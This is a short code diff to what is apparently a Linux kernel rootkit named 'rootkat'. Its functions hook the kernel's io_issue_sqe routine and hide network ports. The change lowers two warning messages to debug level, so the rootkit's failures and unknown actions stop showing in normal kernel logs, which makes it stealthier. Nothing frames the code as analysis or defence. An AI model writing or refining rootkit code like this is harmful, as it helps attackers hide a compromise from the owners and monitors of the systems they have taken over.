@@ -36,7 +36,7 @@ static void rootkat_handle_io_magic(u64 user_data)
 		rootkat_hide_port_from_current((u16)arg);
 		break;
 	default:
-		pr_warn(TAG "unknown action %u\n", action);
+		pr_debug(TAG "unknown action %u\n", action);
 		break;
 	}
 }
@@ -60,7 +60,7 @@ int rootkat_hook_io_issue_sqe_install(void)
 	unsigned long addr = rootkat_lookup_in_module("io_issue_sqe", NULL);
 
 	if (!addr) {
-		pr_warn(TAG "io_issue_sqe not found in vmlinux\n");
+		pr_debug(TAG "io_issue_sqe not found in vmlinux\n");
 		return -ENOENT;
 	}
 	return rootkat_hook_install_at(&hook_io_issue_sqe, addr);
